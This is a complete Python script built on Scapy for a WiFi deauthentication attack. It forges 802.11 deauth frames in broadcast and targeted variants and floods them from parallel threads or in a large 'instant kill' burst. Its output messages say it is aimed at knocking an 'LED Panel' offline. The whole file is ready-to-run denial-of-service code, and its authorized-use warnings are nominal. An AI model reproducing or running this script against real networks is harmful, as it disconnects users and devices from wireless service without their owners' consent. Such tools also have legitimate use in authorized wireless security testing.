#!/usr/bin/env python3
"""
POWERFUL WiFi Deauthentication Attack Script - Kali Linux Edition
==================================================================
WARNING: This script is for educational and authorized testing purposes only.
Unauthorized use of this script may be illegal and unethical.

ULTRA-AGGRESSIVE deauthentication attack with:
- Multiple simultaneous packet types
- Threading for parallel attacks
- Ultra-fast packet sending (no delays)
- Multiple deauth reasons
- Broadcast + Targeted attacks simultaneously
- Immediate effect on target

Usage:
    sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
"""

import sys
import os
import time
import argparse
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# Suppress scapy warnings
import warnings
warnings.filterwarnings("ignore")

class PowerDeauth:
    def __init__(self, interface):
        """
        Initialize the POWERFUL WiFi Deauthentication class
        
        Args:
            interface: Network interface name (e.g., 'wlan0mon')
        """
        self.interface = interface
        self.packet_count = 0
        self.running = False
        self.threads = []
        self.lock = threading.Lock()
        
    def create_deauth_packets(self, target_bssid, client_bssid=None):
        """
        Create multiple variations of deauthentication packets for maximum effectiveness
        """
        packets = []
        
        # Deauth reasons to try (different reasons for different devices)
        reasons = [1, 3, 4, 5, 7, 8]
        
        if client_bssid:
            # Targeted attack - AP to Client
            for reason in reasons:
                packet = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=client_bssid,  # Destination (client)
                    addr2=target_bssid,   # Source (AP)
                    addr3=target_bssid   # BSSID
                ) / Dot11Deauth(reason=reason)
                packets.append(packet)
            
            # Targeted attack - Client to AP
            for reason in reasons:
                packet = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=target_bssid,  # Destination (AP)
                    addr2=client_bssid,   # Source (client)
                    addr3=target_bssid   # BSSID
                ) / Dot11Deauth(reason=reason)
                packets.append(packet)
        else:
            # Broadcast attack - multiple variations
            for reason in reasons:
                # Broadcast from AP
                packet1 = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                    addr2=target_bssid,           # Source (AP)
                    addr3=target_bssid           # BSSID
                ) / Dot11Deauth(reason=reason)
                packets.append(packet1)
                
                # Broadcast to AP (spoofed client)
                packet2 = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=target_bssid,          # Destination (AP)
                    addr2="ff:ff:ff:ff:ff:ff",  # Broadcast source
                    addr3=target_bssid         # BSSID
                ) / Dot11Deauth(reason=reason)
                packets.append(packet2)
        
        return packets
    
    def attack_thread(self, packets, thread_id):
        """
        Attack thread - sends packets as fast as possible
        """
        sent = 0
        while self.running:
            try:
                # Send all packet variations in rapid succession
                for packet in packets:
                    sendp(packet, iface=self.interface, verbose=0, count=1)
                    with self.lock:
                        self.packet_count += 1
                        sent += 1
                
                # Very minimal sleep to prevent overwhelming the interface
                # But still maintain high speed
                time.sleep(0.001)  # 1ms delay - ultra fast
                
            except Exception as e:
                if self.running:
                    print(f"\n[-] Thread {thread_id} error: {e}")
                break
        
        if sent > 0:
            print(f"[*] Thread {thread_id} sent {sent} packets")
    
    def power_attack(self, target_bssid, client_bssid=None, num_threads=5):
        """
        POWERFUL deauthentication attack with multiple threads
        
        Args:
            target_bssid: MAC address of the target access point (LED Panel)
            client_bssid: MAC address of the client (None for broadcast)
            num_threads: Number of parallel attack threads (default: 5)
        """
        print("\n" + "=" * 70)
        print("🔥 POWERFUL DEAUTHENTICATION ATTACK - ULTRA AGGRESSIVE MODE 🔥")
        print("=" * 70)
        print(f"[*] Target AP: {target_bssid}")
        print(f"[*] Client: {client_bssid if client_bssid else 'BROADCAST (ALL CLIENTS)'}")
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Attack Threads: {num_threads}")
        print(f"[*] Packet Speed: ULTRA FAST (1ms intervals)")
        print(f"[*] Mode: MAXIMUM DESTRUCTION")
        print("=" * 70)
        print("\n[!] Attack starting NOW! Press Ctrl+C to stop\n")
        
        # Create all packet variations
        packets = self.create_deauth_packets(target_bssid, client_bssid)
        print(f"[+] Created {len(packets)} different packet variations")
        print(f"[+] Launching {num_threads} parallel attack threads...\n")
        
        # Start attack
        self.running = True
        self.packet_count = 0
        start_time = time.time()
        
        # Launch multiple attack threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(packets, i+1),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.01)  # Small delay between thread starts
        
        try:
            # Monitor and display progress
            last_count = 0
            while self.running:
                time.sleep(1)  # Update every second
                current_count = self.packet_count
                packets_per_sec = current_count - last_count
                elapsed = time.time() - start_time
                total_rate = current_count / elapsed if elapsed > 0 else 0
                
                print(f"\r[*] Packets sent: {current_count:,} | "
                      f"Rate: {packets_per_sec:,}/sec | "
                      f"Avg: {total_rate:.0f}/sec | "
                      f"Time: {elapsed:.1f}s", end='', flush=True)
                
                last_count = current_count
                
        except KeyboardInterrupt:
            print("\n\n[*] Stopping attack...")
            self.running = False
            
            # Wait for threads to finish
            for thread in self.threads:
                thread.join(timeout=2)
            
            elapsed = time.time() - start_time
            print(f"\n[*] Attack stopped by user")
            print(f"[*] Total packets sent: {self.packet_count:,}")
            print(f"[*] Attack duration: {elapsed:.2f} seconds")
            print(f"[*] Average rate: {self.packet_count/elapsed:.0f} packets/second")
            print(f"[*] LED Panel should be DOWN now!")
    
    def instant_kill(self, target_bssid, client_bssid=None):
        """
        INSTANT KILL mode - sends massive burst immediately
        """
        print("\n" + "=" * 70)
        print("⚡ INSTANT KILL MODE - IMMEDIATE DESTRUCTION ⚡")
        print("=" * 70)
        print(f"[*] Target: {target_bssid}")
        print(f"[*] Sending MASSIVE packet burst...\n")
        
        packets = self.create_deauth_packets(target_bssid, client_bssid)
        
        # Send massive burst immediately
        burst_size = 1000  # Send 1000 packets per variation
        total_sent = 0
        
        print(f"[*] Sending {burst_size} packets for each of {len(packets)} variations...")
        print(f"[*] Total: {burst_size * len(packets):,} packets\n")
        
        start_time = time.time()
        for i, packet in enumerate(packets):
            try:
                # Send burst for this packet type
                sendp(packet, iface=self.interface, verbose=0, count=burst_size)
                total_sent += burst_size
                print(f"[+] Sent {burst_size} packets (variation {i+1}/{len(packets)}) - Total: {total_sent:,}")
            except Exception as e:
                print(f"[-] Error sending packets: {e}")
        
        elapsed = time.time() - start_time
        print(f"\n[+] INSTANT KILL complete!")
        print(f"[*] Total packets sent: {total_sent:,}")
        print(f"[*] Time taken: {elapsed:.2f} seconds")
        print(f"[*] Rate: {total_sent/elapsed:.0f} packets/second")
        print(f"[*] LED Panel should be DOWN NOW!")


def get_interface():
    """Get available network interfaces"""
    interfaces = get_if_list()
    wifi_interfaces = []
    
    for iface in interfaces:
        iface_lower = iface.lower()
        if ('wlan' in iface_lower or 'wifi' in iface_lower or 'mon' in iface_lower) and 'lo' not in iface_lower:
            wifi_interfaces.append(iface)
    
    try:
        iwconfig_output = os.popen('iwconfig 2>/dev/null | grep -o "^[^ ]*"').read().strip().split('\n')
        for iface in iwconfig_output:
            if iface and iface not in wifi_interfaces:
                wifi_interfaces.append(iface)
    except:
        pass
    
    return wifi_interfaces


def main():
    parser = argparse.ArgumentParser(
        description="POWERFUL WiFi Deauthentication Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (Kali Linux):
  # POWERFUL attack (default - 5 threads, ultra fast)
  sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
  
  # INSTANT KILL mode (massive burst immediately)
  sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --instant
  
  # More threads for EXTREME power (10 threads)
  sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF --threads 10
  
  # Targeted client attack
  sudo python3 power_deauth.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

WARNING: Use only on networks you own or have explicit permission to test.
        """
    )
    
    parser.add_argument('-i', '--interface', type=str, required=True, help='Network interface (e.g., wlan0mon)')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target AP MAC address (BSSID)')
    parser.add_argument('-c', '--client', type=str, help='Client MAC address (optional, for targeted attack)')
    parser.add_argument('--threads', type=int, default=5, help='Number of attack threads (default: 5, max: 20)')
    parser.add_argument('--instant', action='store_true', help='INSTANT KILL mode - massive burst immediately')
    
    args = parser.parse_args()
    
    # Print warning
    print("=" * 70)
    print("⚠️  WARNING: POWERFUL DEAUTHENTICATION ATTACK TOOL ⚠️")
    print("This tool is for authorized testing only!")
    print("Unauthorized use may be illegal and unethical.")
    print("=" * 70)
    print()
    
    # Validate MAC address format
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    import re
    if not re.match(mac_pattern, args.target):
        print("[-] Invalid MAC address format. Use format: AA:BB:CC:DD:EE:FF")
        sys.exit(1)
    
    if args.client and not re.match(mac_pattern, args.client):
        print("[-] Invalid client MAC address format")
        sys.exit(1)
    
    # Limit threads
    if args.threads > 20:
        print("[!] Maximum 20 threads allowed. Using 20 threads.")
        args.threads = 20
    
    # Initialize attack
    deauth = PowerDeauth(args.interface)
    
    # Check if interface exists
    if args.interface not in get_if_list():
        print(f"[!] Warning: Interface {args.interface} not found in system interfaces")
        print("[!] Continuing anyway...")
    
    # Launch attack
    if args.instant:
        deauth.instant_kill(args.target, args.client)
    else:
        deauth.power_attack(args.target, args.client, args.threads)


if __name__ == "__main__":
    main()

